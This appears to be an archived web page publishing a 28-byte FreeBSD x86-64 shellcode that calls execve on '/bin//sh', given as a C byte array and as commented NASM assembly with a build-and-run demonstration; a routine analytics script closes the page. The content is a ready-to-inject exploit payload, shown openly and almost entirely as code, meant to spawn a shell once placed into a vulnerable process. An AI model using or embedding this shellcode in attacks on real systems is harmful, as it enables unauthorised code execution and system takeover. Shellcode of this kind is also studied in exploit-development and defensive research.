<html><head><title>FreeBSD/x86-64 - execve - 28 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
* Gitsnik, @dracyrys
* FreeBSD x86_64 execve, 28 bytes
*
*/

C source:
char code[] = \
"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
"\x54\x5f\x52\x57\x54\x5e\x0f\x05";

Intel Assembly:

global _start

;
; 28 byte execve FreeBSD x86_64
;
; [gitsnik@bsd64]$ nasm -f elf64 shell.nasm -o shell.o
; [gitsnik@bsd64]$ ld -o shell shell.o
; [gitsnik@bsd64]$ ./shell
; $ exit
; [gitsnik@bsd64]$
;

section .text

_start:
xor rcx, rcx
mul rcx

add al, 0x3b     ; execve()
mov rbx, 0x68732f2f6e69622f ; hs//nib/

; Argument one shell[0] = "/bin//sh"
push rdx     ; null
push rbx     ; hs//nib/

; We need pointers for execve()
push rsp     ; *pointer to shell[0]
pop rdi      ; Argument 1

; Argument two shell (including address of each argument in array)
push rdx     ; null
push rdi     ; address of shell[0]

; We need pointers for execve()
push rsp     ; address of char * shell
pop rsi      ; Argument 2

syscall

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
